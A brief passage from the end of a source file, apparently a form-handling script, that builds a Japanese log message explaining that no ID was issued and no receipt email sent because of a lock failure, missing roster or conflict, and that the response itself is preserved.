      "⛔ 発番も受付メールも行いませんでした（★ ロック取得失敗 / ロスター不在 / conflict のいずれか）。\n" +
        "   ★ 上のログに理由が出ています。⚠️ 回答自体は失われていません。"
    );
  }
}
